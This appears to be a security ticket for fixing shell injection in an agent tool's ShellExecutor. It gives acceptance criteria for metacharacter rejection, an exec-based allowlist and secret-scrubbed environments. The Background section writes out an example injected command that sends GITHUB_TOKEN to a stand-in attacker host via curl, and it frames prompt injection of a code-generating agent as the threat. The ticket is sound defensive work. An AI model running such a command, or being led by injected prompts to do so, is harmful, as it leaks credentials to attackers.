# SEC-C1: Shell injection in `tools/shell_exec.py`

## User Story

As a **security auditor**, I want `ShellExecutor` to reject every shell
metacharacter, so that an agent with `code_gen` access cannot execute
arbitrary commands via prompt injection.

## Background

`src/stronghold/tools/shell_exec.py:155–174` uses
`asyncio.create_subprocess_shell` with a `startswith` prefix allowlist. A
command like `pytest; curl https://attacker/$GITHUB_TOKEN` passes the
allowlist and is then evaluated by `/bin/sh -c`. Subprocess also inherits
the parent env, which carries `GITHUB_TOKEN`, `LITELLM_MASTER_KEY`,
`ROUTER_API_KEY`.

## Acceptance Criteria

- AC1: Given a command containing `;`, `&&`, `||`, `|`, `` ` ``, `$(`, `>`, `<`, or newline, When `ShellExecutor.execute` runs, Then it returns `success=False` with `error="command not allowed"`.
- AC2: Given a command whose `shlex.split` argv[0] is not in the binary allowlist, When executed, Then it returns `success=False`.
- AC3: Given an allowed command, When executed, Then subprocess is spawned via `create_subprocess_exec` (no shell) with `env=` scrubbed of `GITHUB_TOKEN`, `LITELLM_MASTER_KEY`, `ROUTER_API_KEY`, `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`.
- AC4: Given the scrubbed env, When `git` runs, Then `PATH`, `HOME`, `LANG`, and `GIT_ASKPASS` (if set) are preserved so quality gates still work.
- AC5: Given `shlex.split` raises (unterminated quote), When executed, Then it returns `success=False` without invoking subprocess.

## Test Mapping

| AC  | Test path                                     | Test function                                   | Tier     |
|-----|-----------------------------------------------|-------------------------------------------------|----------|
| AC1 | tests/tools/test_shell_exec.py                | test_rejects_shell_metacharacters               | critical |
| AC2 | tests/tools/test_shell_exec.py                | test_rejects_unknown_binary                     | critical |
| AC3 | tests/tools/test_shell_exec.py                | test_env_scrubbed_of_secrets                    | critical |
| AC4 | tests/tools/test_shell_exec.py                | test_env_preserves_path_and_home                | happy    |
| AC5 | tests/tools/test_shell_exec.py                | test_shlex_error_rejected                       | critical |

## Files to Touch

- Modify: `src/stronghold/tools/shell_exec.py` — replace `create_subprocess_shell` with `create_subprocess_exec`; add `_BINARY_ALLOWLIST` (set); add `_scrubbed_env()`; drop `_BLOCKED_PATTERNS`.
- New: `tests/tools/test_shell_exec.py` (if absent) — ACs above.

## Rollback

Single-file change; revert the commit. Quality gates (`run_pytest`, etc.) already pass workspaces via argv, so the `exec` form is drop-in.
